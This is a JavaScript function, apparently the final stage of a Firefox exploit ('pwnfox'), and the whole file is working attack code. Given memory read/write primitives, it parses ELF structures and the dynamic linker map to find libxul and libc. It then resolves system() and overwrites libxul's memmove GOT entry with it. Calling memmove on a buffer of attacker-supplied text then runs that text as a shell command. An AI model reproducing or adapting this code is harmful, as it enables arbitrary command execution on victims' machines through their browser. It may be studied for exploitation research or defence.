function pwnfox_exploit(a_read, a_write, elf_addr, command) {
  var elf_base = find_elf_base(a_read, elf_addr);
  var elf_header = parse_elf_header(a_read, elf_base);
  var elf_segments = parse_elf_segments(
    a_read,
    elf_base,
    elf_header.e_phoff,
    elf_header.e_phentsize,
    elf_header.e_phnum
  );
  var dynamic_segments = get_dynamic_segment(elf_segments);
  var dynamic_entries = parse_dynamic_segment(
    a_read,
    elf_base,
    dynamic_segments[0]
  );
  var pltgot_entries = get_pltgot_from_dynamic(dynamic_entries);
  var linkmap_addr = get_linkmap_addr_from_pltgot(a_read, pltgot_entries[0]);
  var libraries = parse_libraries(a_read, linkmap_addr);

  // Parsing libxul
  var lx_lib = get_library_by_name(libraries, "libxul");
  var lx_dynamic_entries = parse_dynamic_segment_by_addr(a_read, lx_lib.l_ld);
  var lx_dsymtab = get_dsymtab_from_dynamic(lx_dynamic_entries)[0];
  var lx_dstrtab = get_dstrtab_from_dynamic(lx_dynamic_entries)[0];
  var lx_jmprel = get_jmprel_from_dynamic(lx_dynamic_entries)[0];
  // Actually '__memmove_ssse3_back'
  var lx_memmove_sym = parse_symbols(
    a_read,
    lx_dsymtab.d_un,
    lx_dstrtab.d_un,
    "memmove"
  );
  var lx_memmove_rel = parse_jmprel(a_read, lx_jmprel.d_un, lx_memmove_sym.idx);
  var lx_memmove_got_addr = Int64.add(lx_memmove_rel.r_offset, lx_lib.l_addr);
  var lx_fclose_sym = parse_symbols(
    a_read,
    lx_dsymtab.d_un,
    lx_dstrtab.d_un,
    "fclose"
  );
  var lx_fclose_rel = parse_jmprel(a_read, lx_jmprel.d_un, lx_fclose_sym.idx);
  var lx_fclose_got_addr = Int64.add(lx_fclose_rel.r_offset, lx_lib.l_addr);

  // Parsing libc
  var lc_lib = get_library_by_name(libraries, "libc");
  var memmove_addr = u64(readUpto(a_read, lx_memmove_got_addr, 8));
  var fclose_addr = u64(readUpto(a_read, lx_fclose_got_addr, 8));
  var lc_fclose_offset = Int64.sub(fclose_addr, lc_lib.l_addr);

  var lc_system_offset = get_system_offset(lc_fclose_offset);
  var system_addr = Int64.add(lc_lib.l_addr, lc_system_offset);

  var buf = new ArrayBuffer(1000);
  var target = new Uint8Array(buf);
  for (var i = 0;i<command.length;i++) {
    target[i] = command.charCodeAt(i);
  }
  target[command.length] = 0;
  var b = new Uint8Array(buf);

  if ("".contains !== undefined) {
    writeInt64(a_write, lx_memmove_got_addr, system_addr);
    target.set(b);
  } else {
    writeInt64(a_write, lx_memmove_got_addr, system_addr);
    target.copyWithin(0, 1);
  }
}
